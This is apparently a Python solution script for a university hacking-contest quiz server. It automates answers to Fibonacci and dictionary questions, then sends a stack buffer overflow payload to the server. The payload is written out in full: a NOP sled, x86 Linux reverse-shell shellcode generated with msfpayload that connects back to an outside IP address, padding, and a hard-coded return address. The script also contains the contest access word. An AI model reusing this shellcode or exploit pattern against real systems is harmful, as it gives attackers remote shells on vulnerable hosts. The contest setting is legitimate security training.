#!/usr/bin/python3

import socket, time, sys, struct

BUFSIZE=4096
WORDS="/home/ru2013/quiz/sowpods.txt"

cache = {0:0, 1:1} 

def login(ip, port, password):
    """ Login to the server, authenticate and return the socket. """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    
    time.sleep(0.1)

    login_header = s.recv(BUFSIZE)
    if login_header != b'OK\tWelcome to the RU Hacking Contest QUIZ server. You seem to be far along...\nOK\tPlease enter the access word.\n':
        print("Did not get expected server header.")
        print("got: %s)" % login_header)
        sys.exit(1)

    print("- Connected")
    
    # Ok, perform login.
    p = ("%s\n" % password).encode()
    s.send(p)

    time.sleep(0.1)

    auth = s.recv(47)
    if auth != b'OK\tCorrect. Now answer the following questions.':
        print("Could not authenticate to server, wrong password?")
        print("got: %s" % auth)
        sys.exit(1)

    print("- Authenticated")
    
    return s

def parse_question(bytestring):
    """ Parse a question """
    string = bytestring.decode().strip("\n")
    split = string.split("\t")
    
    return split[-1].strip("?").rstrip(" ")

def is_number(string):
    try:
        return int(string)
    except ValueError:
        return False


def read_words(words):
    """ Read a words file, return a list of all the words."""
    with open(words) as f:
        return f.read().split("\n") # Use this instead of splitlines, newlines be gone.


def find_in_wordlist(wordlist, word):
    """ Try to find a word in wordlist. """
    while len(word) != 0:
        for w in wordlist:
            if word == w:
                return wordlist[ wordlist.index(w) + 1 ]
        word = word[0:-1]
        print(word)


def process_word_question(sock, question, wordlist):
    answer = find_in_wordlist(wordlist, question)
    
    print("-- Sending answer %s" % answer)
    sock.send( ("%s\n" % answer).encode() )

    return sock


def fib(n):
    if not n in cache:
        cache[n] = fib(n-1) + fib(n-2)
    return cache[n] 

    
def find_next_fib(num):
    """ Returns the next fibonacci number, fib(n + 1) """
    if num == 1:
        return 2

    n = 1
    while num != fib(n):
        n = n + 1

    return fib(n + 1)
    


if __name__ == "__main__":
    wordlist = read_words(WORDS)

    sock = login('hacking.ru.is', 1337, 'MELODY')

    if len(sys.argv) == 2:
        offset = int(sys.argv[1])
    else:
        offset = 0

    while True:
        time.sleep(0.1)
        chunk = sock.recv(BUFSIZE)
        print("- received chunk: %s" % chunk)

        # Do some evil
        if chunk.decode().strip("\t").split("\n")[0] == "3 more to go...":
            print("- Okay, time to do some evil.")

            # # This is output from
            # # ./msfpayload linux/x86/shell_reverse_tcp LHOST=178.79.138.142 LPORT=1337 N
            # # buf = b"\0x90" * 1024
            

            #buf_addr = 0xbffff660 # This is the base address of buf, in gdb
            # buf_addr = 0xbffff0d0 # This is the base address of buf, without gdb
            # buf_addr = 0xbffff000 + offset # When in doubt, brute force.
            buf_addr = 0xbffff0f0 # Base addr of buf at hacking.ru.is

            print("- Trying to do evil at 0x%x" % buf_addr)
 
            # nop + shellcode should be 168 bytes

            ## 100 bytes of nop
            buf = b"\x90" * 100

            ## Shellcode is 68 bytes
            buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
            buf += b"\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xb2"
            buf += b"\x4f\x8a\x8e\x68\x02\x00\x00\x16\x89\xe1\xb0\x66\x50"
            buf += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73"
            buf += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0"
            buf += b"\x0b\xcd\x80"

            # 108 bytes of pad
            buf += b'\x61' * 54
            buf += b'\x62' * 54

            # The return address is 4 bytes
            buf += struct.pack('<I', buf_addr)

            # 1 byte
            buf += b"\n"

            sock.send( buf )
            time.sleep(0.1)
            print(sock.recv(BUFSIZE))

        q = parse_question(chunk)

        if is_number(q):
            print("- Processing fib question %s" % q)
            
            answer = find_next_fib( int(q) )
            print("-- Sending answer %s" % answer)
            sock.send( ("%s\n" % answer).encode() )
        else:
            print("- Processing word question %s" % q)
            process_word_question(sock, q, wordlist)

            
        response = sock.recv(11)
        if response != b'OK\tCorrect!':
            print("-- Not the correct answer")
            print("Got: %s" % response)
            sys.exit(1)
        print("-- Correct")

    

